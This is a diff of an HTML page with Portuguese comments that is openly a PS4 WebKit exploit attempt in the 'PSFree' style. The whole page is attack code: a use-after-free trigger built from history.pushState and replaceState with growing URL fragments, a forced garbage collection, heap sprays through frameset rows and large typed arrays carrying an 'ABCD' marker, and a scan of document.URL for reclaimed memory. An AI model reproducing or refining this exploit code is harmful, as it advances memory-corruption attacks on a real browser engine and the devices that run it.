@@ -2,139 +2,101 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 WebKit – PSFree fastMalloc Edition</title>
-
+<title>PS4 WebKit – Final PSFree Strategy</title>
+<style>
+    body { font-family: monospace; background:#000; color:#0f0; padding:20px; }
+    button { 
+        font-size:14px; padding:12px; margin:5px; 
+        background:#222; color:#0f0; border:1px solid #0f0; cursor:pointer; width: 320px;
+    }
+    button:hover { background:#0f0; color:#000; }
+    #log { white-space: pre-wrap; border-top: 1px solid #333; margin-top: 20px; }
+</style>
 </head>
 <body>
-<h2>PS4 WebKit – fastMalloc Reclamation (PSFree Style)</h2>
-<p>Status: <span id="status" class="status">Ready</span></p>
-
-<button onclick="runStepA()">1. FINGERPRINT CHECK (VVVV)</button><br>
-<button onclick="runStepB()">2. WINDOWED READ (340KB SCAN)</button><br>
-<button onclick="runStepC()">3. LAYOUT LOGIC CHECK</button><br>
-<button onclick="runStepD()">4. PSFREE RECLAMATION (ADDROF)</button>
-
+<h2>PS4 WebKit – fastMalloc Exhaustion</h2>
+<div id="status">Ready</div>
+<button onclick="runStepD()">RUN PSFREE RECLAMATION</button>
 <div id="log"></div>
 
 <script>
 const logEl = document.getElementById("log");
-const statusEl = document.getElementById("status");
-
 function log(m){ logEl.textContent += m + "\n"; }
 function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
 
-window.keepAlive = [];
+// Técnica do psfree.mjs: Força o Garbage Collector
+function gc() {
+    log("Forcing GC...");
+    for(let i=0; i<10; i++) {
+        new Uint8Array(4 * 1024 * 1024); 
+    }
+}
 
-// --- TRIGGER BASE (ESTABILIDADE COMPROVADA: i < 48) ---
-async function triggerBaseUAF(fastMode = false) {
+async function triggerBaseUAF() {
     logEl.textContent = "";
-    window.keepAlive = [];
-    statusEl.textContent = "Running UAF Phase...";
     log("=== STARTING STABLE UAF (i < 48) ===");
-
     let size = 977;
     const STEP = 14461;
-
     for(let i=0; i<48; i++){
-        let char = String.fromCharCode(0x41 + (i % 26));
-        let frag = char.repeat(size); 
+        let frag = "V".repeat(size); 
         history.pushState({}, "", "#" + frag);
         history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
-        
         if(i % 6 === 0) setTimeout(()=>history.back(), 0);
-        
         size += STEP;
         await sleep(5);
     }
-
-    // Usando os tempos de espera que funcionaram nos seus logs
-    let waitWindow = fastMode ? 40 : 120;
-    let waitGroom = fastMode ? 20 : 80;
-
-    log(">>> UAF WINDOW: " + waitWindow + "ms <<<");
-    await sleep(waitWindow);
-
-    let frames = [];
-    for(let i=0; i<80; i++){
-        let f = document.createElement("iframe");
-        document.body.appendChild(f);
-        try {
-            let d = f.contentDocument; d.open();
-            d.write("<html><body>" + ("X".repeat(2048)) + "</body></html>");
-            d.close();
-        } catch(e){}
-        frames.push(f);
-    }
-    frames.forEach(f=>f.remove());
-    frames = null;
-
-    log(">>> GROOMING WINDOW: " + waitGroom + "ms <<<");
-    await sleep(waitGroom);
+    await sleep(40);
 }
 
-// Passos 1, 2 e 3 mantidos conforme sua análise anterior
-async function runStepA() { await triggerBaseUAF(false); log("\n[A] Fingerprint..."); let url = document.URL; for(let i=0; i<26; i++){ let p = String.fromCharCode(0x41+i).repeat(10); if(url.includes(p)) log("FOUND: " + p.substring(0,4) + " at offset " + url.indexOf(p)); } }
-
-async function runStepB() { await triggerBaseUAF(false); log("\n[B] Hex Probe..."); let url = document.URL; [0, 34, 1000, 50000, 300000].forEach(off => { if(off < url.length) log("["+off+"]: 0x"+url.charCodeAt(off).toString(16).toUpperCase()); }); }
-
-async function runStepC() { await triggerBaseUAF(false); let old = document.URL.length; location.hash = "#TEST"; await sleep(20); log("Sync Check: " + old + " -> " + document.URL.length); }
-
-// --- PASSO D: TÉCNICA PSFREE (fastMalloc) ---
 async function runStepD() {
-    await triggerBaseUAF(true); 
-    log("\n[STEP D] Target: Multi-Size fastMalloc Choke...");
-    statusEl.textContent = "Choking fastMalloc with multiple sizes...";
-
-    let spray = [];
+    await triggerBaseUAF();
     
-    // Técnica de Exaustão: Criamos uma "escada" de tamanhos
-    // Isso garante que preencheremos buracos de diversos tamanhos no fastMalloc
-    const sizes = [16384, 32768, 65536, 131072]; 
+    // 1. Limpa a Heap antes de sprayar (Essencial no PSFree)
+    gc();
     
-    for(let s = 0; s < sizes.length; s++) {
-        let currentSize = sizes[s];
-        log("Spraying size: " + currentSize);
-        
-        for(let i = 0; i < 500; i++) {
-            // Usamos Uint32Array para facilitar a escrita do marcador
-            let a = new Uint32Array(currentSize / 4);
-            // Preenchemos com 0x41424344 ('ABCD')
-            a.fill(0x41424344);
-            // Colocamos o ID no final para saber qual spray ganhou
-            a[a.length - 1] = i; 
-            spray.push(a);
-        }
+    log("Spraying fastMalloc via Framesets...");
+    let sprayFrames = [];
+    
+    // Técnica do psfree.mjs: Alocação via frameset.rows
+    // Isso entra na partição fastMalloc
+    const rowsPattern = ",".repeat(254); 
+    for(let i = 0; i < 400; i++) {
+        let fset = document.createElement("frameset");
+        fset.rows = rowsPattern; // Dispara makeUniqueArray
+        sprayFrames.push(fset);
     }
 
-    window.keepAlive = spray;
-    // Reduzimos o sleep para quase zero para ser mais rápido que a URL
-    await sleep(10); 
+    log("Spraying Oversize Arrays...");
+    let sprayArrays = [];
+    // Técnica do memtools.mjs: Oversize alocação (> 1000 bytes)
+    const TARGET_SIZE = 340356; 
+    for(let i = 0; i < 200; i++) {
+        let a = new Uint32Array(TARGET_SIZE / 4);
+        a.fill(0x41424344); // 'ABCD'
+        sprayArrays.push(a);
+    }
+
+    window.keepAlive = [sprayFrames, sprayArrays];
+    await sleep(50);
 
     let url = document.URL;
-    log("Scanning for 'ABCD' (0x44, 0x43, 0x42, 0x41)...");
+    log("Scanning offsets for Reclamation...");
     
     let found = false;
-    // Varremos até o offset 5000
+    // Buscando o marcador 0x44 (D de ABCD)
     for(let off = 34; off < 5000; off++) {
         let code = url.charCodeAt(off);
-        
-        // Se encontrarmos 0x44 ('D') ou 0x41 ('A')
-        if(code === 0x44 || code === 0x41 || code === 0x42 || code === 0x43) {
-            log("WIN! Marker FOUND at [" + off + "]: 0x" + code.toString(16).toUpperCase());
+        if(code === 0x44 || code === 0x41) {
+            log("SUCCESS! Reclaimed memory at [" + off + "]: 0x" + code.toString(16).toUpperCase());
             found = true;
-            // Mostra os próximos bytes para ver se temos o controle total
-            let dump = "";
-            for(let j=0; j<8; j++) dump += url.charCodeAt(off+j).toString(16) + " ";
-            log("Data Dump: " + dump);
             break;
         }
     }
     
     if(!found) {
-        log("Falha: Memória ainda contém 'V' ou URL.");
-        log("Sugestão: Reinicie o navegador para limpar a fragmentação.");
+        log("Falha: Memória ainda presa em 'V' ou URL.");
+        log("DICA: Tente aumentar o TARGET_SIZE para 400000.");
     }
-    statusEl.textContent = "Analysis Complete";
 }
 </script>
 </body>
